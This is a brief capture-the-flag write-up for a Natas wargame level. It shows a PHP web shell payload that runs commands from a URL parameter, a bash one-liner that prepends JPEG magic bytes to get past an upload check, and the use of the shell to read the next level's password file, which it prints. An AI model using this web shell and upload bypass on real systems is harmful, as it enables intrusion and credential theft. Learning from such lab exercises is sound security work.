- In this level we are presented with a check that prevents us from uploading the PHP code directly
- We write the following payload for it:
```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
- Now we just need to append some magic header bytes in our PHP code using bash to fool the check present on the server side
```bash
(echo -n -e '\xff\xd8\xff\xee'; cat upload.php) > new_upload.php
```
- We simply select this payload in browser and change the value of the hidden random name in our page's HTML to the one with ```.php``` extension such that the browser can execute the PHP code
- Now once our payload is uploaded, we can now execute the PHP code with the ```e``` parameter
- We just send our query param as ```e=cat /etc/natas_webpass/natas14```
- We obtain the password, which is: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ